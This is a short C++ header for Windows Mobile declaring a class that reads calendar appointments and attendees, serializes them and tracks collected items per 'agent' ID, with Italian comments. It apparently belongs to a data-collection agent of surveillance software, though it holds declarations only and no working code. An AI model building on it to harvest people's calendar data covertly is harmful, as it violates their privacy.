
#include <windows.h>
#define REQ_COUNT 2000 //se un utente ha piu' di 2000 contatti gli altri vengono persi

class CPoomCalendar
{
	private:
		static CPoomCalendar* m_pInstance;
		static volatile LONG lLock;

		DWORD hPoom;
		UINT err;
				
		UINT requestedCount;
		UINT handleCount;
		DWORD ptrArray[REQ_COUNT];

		APPOINTMENT **contacts;

		BOOL m_bIsValid;

		std::map<ULONG, identifyAppointment> calendarMapSha1;

		void HandleMultiValuedProperties(unsigned int cAggregatedProps,void *rgAggregatedPropVals, CONTACTACC* contact);
		void AddSingleValuePropertyToContact(CEPROPVAL *v,CONTACTACC* contact);
		void AddPropertyToAppointment(CEPROPVAL *v,APPOINTMENTACC* contact, WORD *yearID);
		void AddAttendeeToAppointment(ATTENDEE *v,APPOINTMENTACC* contact, int posAttendees);
		DWORD _SerializedStringLength(LPCWSTR lpString);
		DWORD _Prefix(DWORD dwLength, int entryType);
		void _SerializeString(LPBYTE *lpDest, LPCWSTR lpString, int entryType);

		UINT CPoomCalendar::SerilaizeAppointment(UINT i, LPBYTE *retlpOutBuf,APPOINTMENTACC* appointment);
		
		UINT CPoomCalendar::LoadMarkup(UINT uAgentId);
		void CPoomCalendar::SaveMarkup(UINT uAgentId,BYTE* storeMarkupAppointment,UINT size);

	public:
		CPoomCalendar();
		~CPoomCalendar();
		void Run(UINT uAgentId);
		static CPoomCalendar* self();
		BOOL IsValid(){ return m_bIsValid; }
		
};